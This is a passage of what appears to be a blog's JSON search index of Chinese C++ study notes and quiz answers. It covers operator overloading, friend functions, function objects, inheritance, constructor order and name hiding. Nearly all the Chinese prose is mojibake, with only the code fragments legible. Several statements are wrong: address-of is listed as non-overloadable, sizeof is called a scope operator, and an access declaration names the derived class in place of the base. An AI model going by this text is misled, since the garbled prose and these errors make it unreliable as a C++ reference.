æ³•è¢«é‡è½½çš„ã€‚ä»¥ä¸‹æ˜¯æ— æ³•è¢«é‡è½½çš„è¿ç®—ç¬¦åˆ—è¡¨ï¼š\næˆå‘˜è®¿é—®è¿ç®—ç¬¦ï¼š. å’Œ .*ã€‚ åŸŸè§£æè¿ç®—ç¬¦ï¼š::ã€‚ æ¡ä»¶è¿ç®—ç¬¦ï¼ˆä¸‰å…ƒè¿ç®—ç¬¦éƒ½ä¸èƒ½é‡è½½ï¼‰ï¼š?:ã€‚ ä½œç”¨åŸŸè¿ç®—ç¬¦ï¼šsizeofã€‚ ç±»å‹è¿ç®—ç¬¦ï¼štypeidã€‚ å–åœ°å€è¿ç®—ç¬¦ï¼š\u0026amp;ã€‚ æˆå‘˜æŒ‡é’ˆè¿ç®—ç¬¦ï¼š.* å’Œ -\u0026gt;*ã€‚ è¿™äº›è¿ç®—ç¬¦å…·æœ‰ç‰¹å®šçš„è¯­æ³•å’Œè¯­ä¹‰ï¼Œæ— æ³•é€šè¿‡é‡è½½æ”¹å˜å…¶è¡Œä¸ºã€‚\n2.ä¸€å…ƒè¿ç®—ç¬¦çš„æ­£ç¡®é‡è½½ # /* Obj Obj::operator+(const Obj\u0026amp; obj) Obj Obj::operator+() Obj Obj::operator\u0026lt;+\u0026gt;(const Obj\u0026amp; obj) Obj Obj::operator(+)(const Obj\u0026amp; obj) */ ä¸€å…ƒè¿ç®—ç¬¦ + çš„é‡è½½å‡½æ•°åªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œå³è¢«æ“ä½œçš„å¯¹è±¡æœ¬èº«ã€‚å› æ­¤ï¼Œå®ƒä¸éœ€è¦é¢å¤–çš„å‚æ•°æ¥è¿›è¡Œæ“ä½œã€‚é‡è½½å‡½æ•°çš„è¿”å›ç±»å‹åº”è¯¥æ˜¯ Obj ç±»å‹ï¼Œè¡¨ç¤ºå¯¹è¿ç®—ç¬¦æ“ä½œåå¾—åˆ°çš„æ–°å¯¹è±¡ã€‚\næ‰€ä»¥ï¼Œæ­£ç¡®çš„å£°æ˜æ˜¯ï¼š\nObj Obj::operator+(); 3.æœ‰äº›è¿ç®—ç¬¦åªèƒ½ç”¨æˆå‘˜å‡½æ•°è¿›è¡Œé‡è½½ # äºŒè¿›åˆ¶è¿ç®—ç¬¦=ï¼ˆèµ‹å€¼ï¼‰ï¼Œ[]ï¼ˆæ•°ç»„è®¢é˜…ï¼‰ï¼Œ-\u0026gt;ï¼ˆæˆå‘˜è®¿é—®ï¼‰ä»¥åŠnå…ƒ()ï¼ˆå‡½æ•°è°ƒç”¨ï¼‰è¿ç®—ç¬¦å¿…é¡»å§‹ç»ˆå®ç°ä¸ºæˆå‘˜å‡½æ•°ï¼Œå› ä¸ºè¯­è¨€çš„è¯­æ³•è¦æ±‚å®ƒä»¬ã€‚ â€œ=â€ å· åŸå› ï¼šåœ¨è¿›è¡Œèµ‹å€¼çš„æ—¶å€™ä¼šè°ƒç”¨æ„é€ å‡½æ•°ï¼Œæ¯”å¦‚int a, a = 5. ä¼šæ‰§è¡Œä¸¤æ¬¡æ„é€ å‡½æ•°ï¼Œå¦‚æœæ²¡é‡è½½\u0026quot;=\u0026quot;ï¼Œä¼šè°ƒç”¨é»˜è®¤çš„ï¼›å¦‚æœé‡è½½äº†ä¼šè°ƒç”¨é‡è½½åçš„ã€‚å¦‚æœå¯¹\u0026quot;=\u0026ldquo;ç”¨å‹å…ƒå‡½æ•°è¿›è¡Œé‡è½½ï¼Œå‹å…ƒå‡½æ•°åªæ˜¯ç±»çš„â€œæœ‹å‹â€ï¼Œä¸æ˜¯ç±»çš„æˆå‘˜å‡½æ•°ï¼Œä¾¿ä¼šå‡ºç°ä»¥ä¸‹æƒ…æ™¯ï¼šç¨‹åºä¼šå‡ºç°ä¸¤ç§çŸ›ç›¾ 1.è®¤ä¸ºæ²¡æœ‰é‡è½½èµ‹å€¼è¿ç®—ç¬¦çš„æˆå‘˜å‡½æ•°ï¼Œè°ƒç”¨ç›¸åº”çš„æ„é€ å‡½æ•° 2.åœ¨å…¨å±€èŒƒå›´å†…ï¼Œåˆé‡è½½äº†èµ‹å€¼è¿ç®—ç¬¦å‡½æ•°ï¼Œèµ‹å€¼è¯­å¥æ­£å¥½å’Œè¿™ä¸ªå‡½æ•°åŒ¹é…ä¸Šäº†ï¼Œä¹Ÿä¼šå»è°ƒç”¨è¿™ä¸ªå‡½æ•° å‡ºç°äº†çŸ›ç›¾ -\u0026gt;ã€[]ã€()åŒæ ·ä¹Ÿæ˜¯è¿™æ ·\n4.\u0026laquo;è¿ç®—ç¬¦åªèƒ½ç”¨éæˆå‘˜å‡½æ•°è¿›è¡Œé‡è½½ # åŸå› ï¼šè¿ç®—ç¬¦ä½œä¸ºæˆå‘˜å‡½æ•°æ—¶ï¼Œå…¶å·¦ä¾§è¿ç®—å¯¹è±¡å¿…é¡»æ˜¯è¿ç®—ç¬¦æ‰€å±ç±»çš„ä¸€ä¸ªå¯¹è±¡ï¼Œ æ˜¾ç„¶ â€œ\u0026laquo;â€ ä¸æ˜¯\n5.éæˆå‘˜å‡½æ•°é‡è½½è¿ç®—ç¬¦ç›´æ¥åœ¨ç±»å¤–éƒ¨å£°æ˜å®šä¹‰å³å¯,ä¹Ÿå¯ä»¥å®šä¹‰ä¸ºç±»çš„å‹å…ƒå‡½æ•° # é€‰æ‹©éæˆå‘˜å‡½æ•°é‡è½½è¿ç®—ç¬¦çš„å¦ä¸€ä¸ªåŸå› æ˜¯ä¸ºäº†ä½¿è¯¥è¿ç®—ç¬¦å¯äº¤æ¢ã€‚\nå¦‚æœæˆ‘ä»¬å°†è¿ç®—ç¬¦é‡è½½ä¸ºç±»çš„æˆå‘˜å‡½æ•°ï¼Œé‚£ä¹ˆæ“ä½œæ•°çš„é¡ºåºæ˜¯å›ºå®šçš„ï¼Œå·¦æ“ä½œæ•°æ˜¯è°ƒç”¨è¯¥æˆå‘˜å‡½æ•°çš„å¯¹è±¡ã€‚ä½†æ˜¯ï¼Œé€šè¿‡å°†è¿ç®—ç¬¦é‡è½½ä¸ºéæˆå‘˜å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸åŒç±»å‹çš„æ“ä½œæ•°ä¹‹é—´è¿›è¡Œäº¤æ¢ã€‚\nä¾‹å¦‚ï¼Œå¯¹äºäºŒå…ƒè¿ç®—ç¬¦ +ï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸¤ä¸ªé‡è½½å‡½æ•°ï¼šä¸€ä¸ªæ˜¯æˆå‘˜å‡½æ•°å½¢å¼çš„é‡è½½ï¼Œå¦ä¸€ä¸ªæ˜¯éæˆå‘˜å‡½æ•°å½¢å¼çš„é‡è½½ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬æ—¢å¯ä»¥ä½¿ç”¨å¯¹è±¡ç›¸åŠ ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æ“ä½œæ•°é¡ºåºçš„äº¤æ¢æ¥å®ç°ç›¸åŒçš„ç»“æœã€‚\ncppå¤åˆ¶ä»£ç class MyClass { public: int value; MyClass(int v) : value(v) {} // æˆå‘˜å‡½æ•°å½¢å¼çš„é‡è½½ MyClass operator+(const MyClass\u0026amp; other) { return MyClass(value + other.value); } }; // éæˆå‘˜å‡½æ•°å½¢å¼çš„é‡è½½ //MyClassä¸ºè¿”å›ç±»å‹ï¼Œæœ‰ä¸¤ä¸ªå‚æ•° MyClass operator+(const MyClass\u0026amp; obj1, const MyClass\u0026amp; obj2) { return MyClass(obj1.value + obj2.value); } é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä¸¤ç§æ–¹å¼æ‰§è¡Œç›¸åŒçš„æ“ä½œï¼š\ncppå¤åˆ¶ä»£ç MyClass obj1(5); MyClass obj2(10); MyClass result1 = obj1 + obj2; // ä½¿ç”¨æˆå‘˜å‡½æ•°å½¢å¼çš„é‡è½½ MyClass result2 = obj2 + obj1; // ä½¿ç”¨éæˆå‘˜å‡½æ•°å½¢å¼çš„é‡è½½ï¼ˆäº¤æ¢äº†æ“ä½œæ•°é¡ºåºï¼‰ è¿™ç§å¯äº¤æ¢æ€§å¯ä»¥æé«˜ä»£ç çš„çµæ´»æ€§å’Œå¯è¯»æ€§ã€‚\na+b operator+(a,b) a.operator+(b) -a operator-(a) a.operator-() a++ operator++(a,0) a.operator++(0) â€“a operatorâ€“(a) a.operatorâ€“(); å·¦è¾¹ä¸ºå‹å…ƒå‡½æ•°ï¼Œå³è¾¹ä¸ºç±»æˆå‘˜å‡½æ•°\nå‹å…ƒå‡½æ•° # friend void sum_1(A \u0026amp;a, B \u0026amp;b); // å…¨å±€å‡½æ•° sum_1 friend void A::sum_2(B \u0026amp;b); // å‹å…ƒå‡½æ•° A::sum_2 é€‰é¡¹çº æ­£åï¼š\nA.å‹å…ƒå‡½æ•°ä¸æ˜¯ç±»çš„æˆå‘˜å‡½æ•° B.å‹å…ƒå‡½æ•°ç ´åäº†ç±»çš„å°è£…æ€§å’Œéšè—æ€§ C.å‹å…ƒå‡½æ•°èƒ½è®¿é—®ç±»çš„ protected æˆå‘˜ä¹Ÿèƒ½èƒ½è®¿é—® private æˆå‘˜ D.å‹å…ƒå‡½æ•°æ²¡æœ‰ç±»çš„å¯¹è±¡çš„thisæŒ‡é’ˆ æ®µé”™è¯¯ # ä¸‹é¢å“ªç§æƒ…å†µä¼šå¯¼è‡´æ®µé”™è¯¯ï¼Ÿ A.è®¿é—®äº†ä¸å­˜åœ¨æˆ–è€…å—ä¿æŠ¤çš„åœ°å€ç©ºé—´ B.è®¿é—®äº†æœªåˆå§‹åŒ–æˆ–è€…å·²ç»é‡Šæ”¾çš„æŒ‡é’ˆ C.è®¿é—®äº†è¶Šç•Œæˆ–è€…æ— æ•ˆçš„æ•°ç»„å…ƒç´  D.ä¸Šè¿°éƒ½ä¼š ï¼ˆDï¼‰ ","date":"June 30, 2023","permalink":"/posts/c++/homework/c++%E7%90%86%E8%AE%BA2/","section":"Posts","summary":"æ„é€ å‡½æ•° # 1.æ„é€ å‡½æ•°1çš„å‚æ•°åˆ—è¡¨ //ä»¥ä¸‹ä¸¤ä¸ªæ„é€ å‡½æ•°éƒ½æ˜¯æ²¡","title":"C++ç†è®º2"},{"content":" explicit # å½“ä¸€ä¸ªç±»çš„æ„é€ å‡½æ•°æœ‰å¤šä¸ªå‚æ•°ï¼Œé™¤ç¬¬ä¸€ä¸ªå‚æ•°å¤–å…¶å®ƒéƒ½æœ‰é»˜è®¤å€¼æ—¶ï¼Œexplicit ä»ç„¶æœ‰æ•ˆ\nexplicit å…³é”®å­—åªèƒ½ç”¨äºç±»çš„æ„é€ å‡½æ•°å’Œè½¬æ¢å‡½æ•°å£°æ˜ï¼Œä¸èƒ½ç”¨äºæ™®é€šå‡½æ•°å£°æ˜ã€‚\nèŠ±æ‹¬å·åˆ—è¡¨åˆå§‹åŒ– # class A { public: explicit A(int x) : value(x) {} int value; }; void f(A a) { ... } int main() { f(42);//error f(A(42));//è°ƒç”¨æ„é€ å‡½æ•° f(A{42})ï¼›//ç›´æ¥åˆå§‹åŒ–èµ‹å€¼value=42 return0; } class Test { int a; int b; public: C(int i, int j); }; Test t{0,0}; //C++11 onlyï¼Œç›¸å½“äº Test t(0,0); Test* pT=new Test{1,2}; //C++11 onlyï¼Œç›¸å½“äº Test* pT=new Test(1,2); int* a = new int[3]{1,2,0}; //C++11 only å‡½æ•°å¯¹è±¡ # class Add { public: int operator()(int a, int b) const { return a + b; } }; è°ƒç”¨è¯­æ³•ï¼š Add()(1,2) //åŒ¿åå¯¹è±¡ Add my_name() (a,b) //mynameçš„å¯¹è±¡ ä½¿ç”¨å‡½æ•°å¯¹è±¡çš„ä¼˜ç‚¹: 1.å¯ä»¥å¾ˆå¥½çš„ä¸STLç®—æ³•ç»“åˆ 2.å‡½æ•°å¯¹è±¡æ¯”å‡½æ•°æŒ‡é’ˆå¿«ä¸€ç‚¹ï¼Œæœ‰æ›´é«˜çš„è¿è¡Œæ•ˆç‡ 3.å‡½æ•°å¯¹è±¡ä¼šæ”¯æŒçŠ¶æ€ 1.å‡½æ•°ç±» # ä¸€ä¸ªå‡½æ•°ç±»ï¼Œå³ä¸€ä¸ªé‡è½½äº†æ‹¬å·æ“ä½œç¬¦()çš„ç±»ã€‚å½“ç”¨è¯¥ç±»çš„å¯¹è±¡è°ƒç”¨æ­¤æ“ä½œç¬¦æ—¶ï¼Œå…¶è¡¨ç°å½¢å¼å¦‚åŒæ™®é€šå‡½æ•°è°ƒç”¨ä¸€èˆ¬ï¼Œå› æ­¤å–åå«å‡½æ•°ç±»ã€‚ä¸¾ä¸ªæœ€ç®€å•çš„ä¾‹å­ï¼š\nclass cmp { public: booloperator () (constint\u0026amp; a, constint\u0026amp; b) { return a\u0026gt;=b; } }; cmp my_cmp; result = my_cmp(3,4);//0 class A { public: void operator() () { cout\u0026lt;\u0026lt;\u0026#34;Hello\u0026#34;\u0026lt;\u0026lt;endl; } }; A a; a();//å½¢å¼ä¸Šç­‰åŒäºç›´æ¥è°ƒç”¨å‡½æ•°f: void f() { cout\u0026lt;\u0026lt;\u0026#34;Hello\u0026#34;\u0026lt;\u0026lt;endl; } 2.std::functionç±» # å½“ä½ éœ€è¦ä¸€ä¸ªéæ¨¡æ¿å‡½æ•°å¯¹è±¡ä½œä¸ºç±»çš„æˆå‘˜æˆ–è€…å‡½æ•°å‚æ•°æ—¶ï¼Œä½ å¿…é¡»æŒ‡å®šå‡½æ•°å¯¹è±¡çš„å…·ä½“ç±»å‹ã€‚C++ä¸­çš„å‡½æ•°å¯¹è±¡å¹¶æ²¡æœ‰ä¸€ä¸ªåŸºç±»ï¼Œä½†æ˜¯æ ‡å‡†åº“æä¾›äº†ä¸€ä¸ªæ¨¡æ¿ç±»std::functionæ¥ä»£è¡¨æ‰€æœ‰çš„å‡½æ•°å¯¹è±¡ã€‚\n**3.**ä¸‹é¢å“ªä¸ªé€‰é¡¹ä¸æ˜¯å‡½æ•°å¯¹è±¡çš„è¦æ±‚ï¼Ÿ\nA.å®ƒå¿…é¡»åŒ…å«ä¸€ä¸ªå‡½æ•°è°ƒç”¨è¿ç®—ç¬¦ã€‚\nB.å®ƒå¿…é¡»é‡è½½å‡½æ•°è°ƒç”¨è¿ç®—ç¬¦\nC.å®ƒå¿…é¡»ç»§æ‰¿è‡ªstd::function\nD.å®ƒå¯ä»¥æ˜¯ä¸€ä¸ªç±»æˆ–ç»“æ„ä½“\nï¼ˆCï¼‰\n4.å‡½æ•°å¯¹è±¡å¯ä»¥è¢«é»˜è®¤æ„é€ å‡½æ•°åˆå§‹åŒ–ï¼Œä¸€ä¸ªå‡½æ•°å¯¹è±¡ç±»å…·æœ‰ä¸€ä¸ªé»˜è®¤æ„é€ å‡½æ•°ã€‚\nç»§æ‰¿ # 1.å…¬æœ‰ç»§æ‰¿ä½¿å¾—æ´¾ç”Ÿç±»å¯ä»¥è®¿é—®åŸºç±»ä¸­çš„å…¬æœ‰æˆå‘˜ã€‚ # å½“ä½¿ç”¨å…¬æœ‰ç»§æ‰¿æ—¶ï¼ŒåŸºç±»çš„å…¬æœ‰æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­ä»ç„¶å…·æœ‰å…¬æœ‰è®¿é—®æƒé™ï¼Œå¯ä»¥è¢«æ´¾ç”Ÿç±»çš„å¯¹è±¡ç›´æ¥è®¿é—®å’Œä½¿ç”¨ã€‚\nä¿æŠ¤ç»§æ‰¿å’Œç§æœ‰ç»§æ‰¿éƒ½é™åˆ¶äº†å¯¹åŸºç±»æˆå‘˜çš„è®¿é—®æƒé™ã€‚ä¿æŠ¤ç»§æ‰¿ä¸‹ï¼ŒåŸºç±»çš„å…¬æœ‰æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­å˜ä¸ºä¿æŠ¤æˆå‘˜ï¼Œåªèƒ½è¢«æ´¾ç”Ÿç±»è‡ªèº«åŠå…¶å­ç±»è®¿é—®ï¼Œæ— æ³•è¢«å¤–éƒ¨å¯¹è±¡ç›´æ¥è®¿é—®ã€‚ç§æœ‰ç»§æ‰¿ä¸‹ï¼ŒåŸºç±»çš„å…¬æœ‰æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­å˜ä¸ºç§æœ‰æˆå‘˜ï¼Œåªèƒ½ç”±æ´¾ç”Ÿç±»è‡ªèº«è®¿é—®ï¼Œå¤–éƒ¨å¯¹è±¡æ— æ³•ç›´æ¥è®¿é—®ã€‚\n2.å­ç±»åªèƒ½é€šè¿‡å­ç±»å¯¹è±¡è®¿é—®çˆ¶ç±»ä¿æŠ¤æˆå‘˜ # #include \u0026lt;iostream\u0026gt; class Base { public: Base(int id) : m_id(id) {} void GetId() { m_id++; std::cout \u0026lt;\u0026lt; m_id \u0026lt;\u0026lt; std::endl; } protected: void GetZero() { std::cout \u0026lt;\u0026lt; 0 \u0026lt;\u0026lt; std::endl; } private: int m_id; }; class Child : public Base { public: Child() : Base(6) {} void GetIdInChild() { GetId(); } void GetZeroInChild() { GetZero(); //è®¿é—®protectedæˆå‘˜éœ€è¦ç”¨è¿‡å­ç±»å¯¹è±¡ï¼ï¼ï¼ } }; int main() { Child child; child.GetId();//å¯ä»¥ child.GetZero();//æŠ¥é”™ child.GetZeroInChild();//å¯ä»¥ return 0; } 3.æ´¾ç”Ÿç±»çš„å¯¹è±¡ä¸èƒ½è®¿é—®æ´¾ç”Ÿç±»ç»§æ‰¿åŸºç±»çš„å…¬æœ‰æˆå‘˜å’Œä¿æŠ¤æˆå‘˜ # æ´¾ç”Ÿç±»çš„å†…éƒ¨æˆå‘˜æ‰å¯ä»¥è®¿é—®ï¼\n4.æ´¾ç”Ÿç±»å¯¹è±¡ä¸ä¸€å®šæ¯”åŸºç±»å¯¹è±¡å¤§ã€‚ # å¯ä»¥æ˜¯ä¸€æ ·å¤§çš„ï¼\næœ‰å¯èƒ½å­ç±»åªæ˜¯æ”¹å†™çˆ¶ç±»çš„æ–¹æ³•è€Œå·²ï¼Œå¹¶æ²¡æœ‰å¢åŠ å…¶è‡ªèº«çš„æ•°æ®æˆå‘˜ï¼Œåˆ™å¤§å°ä¸€æ ·ï¼Œæ•…é”™è¯¯\nä¸‹é¢å…³äºç»§æ‰¿è¯´æ³•ä¸æ­£ç¡®çš„æ˜¯: A.ç»§æ‰¿å¯ä»¥ä½¿ç”¨ç°æœ‰ç±»çš„æ‰€æœ‰åŠŸèƒ½ï¼Œå¹¶åœ¨æ— éœ€é‡æ–°ç¼–å†™åŸæ¥ç±»çš„æƒ…å†µä¸‹å¯¹è¿™äº›åŠŸèƒ½è¿›è¡Œæ‰©å±•ã€‚ B.ç»§æ‰¿ä½“ç³»ä¸­æ´¾ç”Ÿç±»åº”ä½“ç°å‡ºä¸åŸºç±»çš„ä¸åŒã€‚ C.æ´¾ç”Ÿç±»å¯¹è±¡ä¸€å®šæ¯”åŸºç±»å¯¹è±¡å¤§ã€‚ D.ç»§æ‰¿å‘ˆç°äº†é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡çš„å±‚æ¬¡ç»“æ„ï¼Œä½“ç°äº†ç”±ç®€å•åˆ°å¤æ‚çš„è®¤çŸ¥è¿‡ç¨‹ã€‚ ï¼ˆCï¼‰ 5.åŸºç±»æŒ‡é’ˆå¯ä»¥æŒ‡å‘ä¸€ä¸ªæ´¾ç”Ÿç±»å¯¹è±¡ï¼Œä½†æ´¾ç”Ÿç±»æŒ‡é’ˆä¸èƒ½æŒ‡å‘åŸºç±»å¯¹è±¡ # æ´¾ç”Ÿç±»å¯ä»¥ä½¿ç”¨åŸºç±»çš„æŒ‡é’ˆæˆ–å¼•ç”¨æŒ‡å‘åŸºç±»å¯¹è±¡æˆ–æ´¾ç”Ÿç±»å¯¹è±¡ï¼Œä½†åè¿‡æ¥å°±ä¸æ­£ç¡®äº†\n6.å…³äºæ„é€ å‡½æ•°çš„è°ƒç”¨é¡ºåº # ç”±åŸºç±»å†åˆ°æ´¾ç”Ÿç±»\nåŸºç±»æ„é€ å‡½æ•°åœ¨æ´¾ç”Ÿç±»æ„é€ å‡½æ•°ä¹‹å‰è°ƒç”¨ã€‚\nåŸºç±»ææ„å‡½æ•°åœ¨æ´¾ç”Ÿç±»ææ„å‡½æ•°ä¹‹åè°ƒç”¨ã€‚\nclass A {} class B : public A {} class C : public B {} C my_obj(); /*é¡ºåºï¼š A() is called. B() is called. C() is called. ~C() is called. ~B() is called. ~A() is called.*/ 7.æ„é€ å‡½æ•°çš„éšå¼è°ƒç”¨å’Œæ˜¾å¼è°ƒç”¨ # æ³¨æ„ï¼šæ´¾ç”Ÿç±»çš„ææ„å‡½æ•°ä¸èƒ½æ˜¾å¼è°ƒç”¨åŸºç±»çš„ææ„å‡½æ•°ã€‚\né€šè¿‡æ´¾ç”Ÿç±»çš„æ„é€ å‡½æ•°è°ƒç”¨åŸºç±»çš„æ„é€ å‡½æ•°æœ‰ä¸¤ç§æ–¹å¼ï¼šéšå¼è°ƒç”¨å’Œæ˜¾å¼è°ƒç”¨ã€‚\næ‰€è°“éšå¼è°ƒç”¨ï¼Œå°±æ˜¯åœ¨æ´¾ç”Ÿç±»çš„æ„é€ å‡½æ•°ä¸­ä¸æŒ‡å®šå¯¹åº”çš„åŸºç±»çš„æ„é€ å‡½æ•°ï¼Œè¿™ä¸ªæ—¶å€™è°ƒç”¨çš„æ˜¯åŸºç±»çš„é»˜è®¤æ„é€ å‡½æ•°(å³å«æœ‰é»˜è®¤å‚æ•°å€¼æˆ–ä¸å¸¦å‚æ•°çš„æ„é€ å‡½æ•°)ã€‚\nè€Œæ‰€è°“æ˜¾å¼è°ƒç”¨ï¼Œå°±æ˜¯åœ¨æ´¾ç”Ÿç±»çš„æ„é€ å‡½æ•°ä¸­æŒ‡å®šè¦è°ƒç”¨çš„åŸºç±»çš„æ„é€ å‡½æ•°ï¼Œå¹¶å°†æ´¾ç”Ÿç±»æ„é€ å‡½æ•°çš„éƒ¨åˆ†å‚æ•°å€¼ä¼ é€’ç»™åŸºç±»æ„é€ å‡½æ•°ã€‚\næ³¨ï¼šé™¤éåŸºç±»æœ‰é»˜è®¤çš„æ„é€ å‡½æ•°ï¼Œå¦åˆ™å¿…é¡»é‡‡ç”¨æ˜¾å¼è°ƒç”¨ã€‚\né‡å®šä¹‰ # åœ¨åŸºç±»å’Œå­ç±»ä¸­ï¼Œå¯ä»¥å­˜åœ¨ç›¸åŒåç§°å’Œå½¢å‚åˆ—è¡¨çš„å‡½æ•°ï¼Œå½“åŸºç±»å‡½æ•°æ²¡æœ‰virtualå…³é”®å­—æ—¶ï¼Œå½¢æˆçš„æ˜¯é‡å®šä¹‰\n1.é‡åå°±ä¼šå¯¼è‡´é‡å®šä¹‰ï¼ˆåŒåéšè—ï¼‰ï¼š\nï¼ˆ1ï¼‰åŸºç±»ä¸å­ç±»å‡½æ•°åå­—ç›¸åŒï¼Œå‚æ•°ä¸åŒï¼Œå½¢æˆçš„æ˜¯é‡å®šä¹‰ï¼ˆéšè—ï¼‰ï¼Œä¸æ˜¯é‡è½½\nï¼ˆ2ï¼‰æˆå‘˜å‡½æ•°åœ¨åŒä¸€ä¸ªç±»é‡Œé¢åŒåï¼Œæ­¤æ—¶æ„æˆäº†é‡è½½ï¼Œä½†å˜é‡ä¸€å®šä¸èƒ½åŒå\nï¼ˆ3ï¼‰ å¦‚æœæ´¾ç”Ÿç±»çš„å‡½æ•°å’ŒåŸºç±»çš„å‡½æ•°åŒåï¼Œä½†æ˜¯å‚æ•°ä¸åŒï¼Œæ­¤æ—¶ï¼Œä¸ç®¡æœ‰æ— virtualï¼ŒåŸºç±»çš„å‡½æ•°è¢«éšè—ã€‚\nå¦‚æœæ´¾ç”Ÿç±»çš„å‡½æ•°ä¸åŸºç±»çš„å‡½æ•°åŒåï¼Œå¹¶ä¸”å‚æ•°ä¹Ÿç›¸åŒï¼Œä½†æ˜¯åŸºç±»å‡½æ•°æ²¡æœ‰vitualå…³é”®å­—ï¼Œæ­¤æ—¶ï¼ŒåŸºç±»çš„å‡½æ•°è¢«éšè—ï¼ˆå¦‚æœç›¸åŒæœ‰Virtualå°±æ˜¯é‡å†™è¦†ç›–äº†ï¼‰ã€‚\né‡è½½ï¼šå‡½æ•°åç›¸åŒï¼Œå‡½æ•°çš„å‚æ•°ä¸ªæ•°ã€å‚æ•°ç±»å‹æˆ–å‚æ•°é¡ºåºä¸‰è€…ä¸­å¿…é¡»è‡³å°‘æœ‰ä¸€ç§ä¸åŒã€‚å‡½æ•°è¿”å›å€¼çš„ç±»å‹å¯ä»¥ç›¸åŒï¼Œä¹Ÿå¯ä»¥ä¸ç›¸åŒã€‚å‘ç”Ÿåœ¨ä¸€ä¸ªç±»å†…éƒ¨ã€‚ é‡å®šä¹‰ï¼šä¹Ÿå«åšéšè—ï¼Œå­ç±»é‡æ–°å®šä¹‰çˆ¶ç±»ä¸­æœ‰ç›¸åŒåç§°çš„éè™šå‡½æ•° ( å‚æ•°åˆ—è¡¨å¯ä»¥ä¸åŒ ) ï¼ŒæŒ‡æ´¾ç”Ÿç±»çš„å‡½æ•°å±è”½äº†ä¸å…¶åŒåçš„åŸºç±»å‡½æ•°ã€‚å¯ä»¥ç†è§£æˆå‘ç”Ÿåœ¨ç»§æ‰¿ä¸­çš„é‡è½½ã€‚ é‡å†™ï¼šä¹Ÿå«åšè¦†ç›–ï¼Œä¸€èˆ¬å‘ç”Ÿåœ¨å­ç±»å’Œçˆ¶ç±»ç»§æ‰¿å…³ç³»ä¹‹é—´ã€‚å­ç±»é‡æ–°å®šä¹‰çˆ¶ç±»ä¸­æœ‰ç›¸åŒåç§°å’Œå‚æ•°çš„è™šå‡½æ•°ã€‚(override) #include\u0026lt;iostream\u0026gt; using namespace std; class A{ public: void f(int a) { cout \u0026lt;\u0026lt; \u0026#34;A\u0026#34; \u0026lt;\u0026lt; endl; } }; class B : public A{ public: void f() //æ”¹ä¸ºg() { cout \u0026lt;\u0026lt; \u0026#34;B\u0026#34; \u0026lt;\u0026lt; endl; } }; int main() { B b; b.f(1);//æœªæ”¹ä¸ºg();ç¼–è¯‘é”™è¯¯ b.f(2);//æ”¹ä¸ºg();ç¼–è¯‘æˆåŠŸ } ä»æ´¾ç”Ÿç±»ä¸­å¯¹è±¡ä¸­è®¿é—®åŸºç±»æˆå‘˜å‡½æ•°ï¼ˆå·²é‡å®šä¹‰ï¼‰ my_Child.Base::f() 1.åœ¨BASEç±»å£°æ˜äº†å…¬å…±æˆå‘˜å‡½æ•°void set_i()ï¼Œæ´¾ç”Ÿç±»DERIVEDä½¿ç”¨privateç»§æ‰¿è®¿é—®æ§åˆ¶ï¼Œå¯ä»¥ä½¿ç”¨â€œè®¿é—®å£°æ˜â€æ¢å¤ä¸ºåŸæ¥çš„è®¿é—®æ§åˆ¶æ–¹å¼ï¼Œè®¿é—®å£°æ˜çš„å½¢å¼ä¸º:\nusing DERIVED::set_i; åœ¨æ´¾ç”Ÿç±»ä¸­ä½¿ç”¨privateç»§æ‰¿æ—¶ï¼ŒåŸºç±»çš„å…¬å…±æˆå‘˜å‡½æ•°ä¼šå˜ä¸ºç§æœ‰æˆå‘˜ï¼Œåœ¨å¤–éƒ¨æ— æ³•ç›´æ¥è®¿é—®ã€‚ä½¿ç”¨è®¿é—®å£°æ˜using DERIVED::set_i;å¯ä»¥å°†åŸºç±»çš„set_i()å‡½æ•°æ¢å¤ä¸ºå¯è®¿é—®çš„æ–¹å¼ã€‚è¿™æ ·å°±å¯ä»¥åœ¨æ´¾ç”Ÿç±»ä¸­é€šè¿‡æ´¾ç”Ÿç±»å¯¹è±¡è®¿é—®åŸºç±»çš„set_i()å‡½æ•°äº†ã€‚\n2.åˆ›å»ºæ´¾ç”Ÿç±»å¯¹è±¡æ—¶æ„é€ å‡½æ•°çš„è°ƒç”¨æ¬¡åº # A.æœ€å…ˆè°ƒç”¨è™šåŸºç±»çš„æ„é€ å‡½æ•°\nB.å…¶æ¬¡è°ƒç”¨æ™®é€šåŸºç±»çš„æ„é€ å‡½æ•°ï¼Œå¤šåŸºç±»æŒ‰ç…§åˆå§‹åŒ–åˆ—è¡¨ä¸­çš„æ¬¡åºè°ƒç”¨\nï¼ˆBé”™ï¼‰åº”è¯¥æ˜¯ç»§æ‰¿æ—¶çš„é¡ºåºï¼Œä¸æ˜¯åˆå§‹åŒ–åˆ—è¡¨\nC.å†æ¬¡è°ƒç”¨å¯¹è±¡æˆå‘˜çš„æ„é€ å‡½æ•°ï¼ŒæŒ‰ç±»å£°æ˜ä¸­å¯¹è±¡æˆå‘˜å‡ºç°çš„æ¬¡åºè°ƒç”¨\nD.æœ€åæ‰§è¡Œæ´¾ç”Ÿç±»çš„æ„é€ å‡½æ•°\n#include\u0026lt;iostream\u0026gt; using namespace std; class A{ public: A(int x){ cout\u0026lt;\u0026lt;\u0026#34;A\u0026#34;\u0026lt;\u0026lt;x; } }; class B{ public: B(int x) { cout \u0026lt;\u0026lt; \u0026#34;B\u0026#34;\u0026lt;\u0026lt;x; } }; class C: public B, public A{ public: C(int x=3):A(1), B(2){ cout\u0026lt;\u0026lt;\u0026#34;C\u0026#34;\u0026lt;\u0026lt;x; } }; int main() { C c; } //è¾“å‡ºï¼šB2A1C3 å¦‚æœæ˜¯ï¼š class C: public A, public B{ //åˆ™ä¸ºï¼šA1B2C3 çœ‹å‡ºç°åœ¨ç±»ä¸­çš„é¡ºåºï¼ˆæ­¤å¤„ä¸ºç»§æ‰¿é¡ºåºï¼‰ 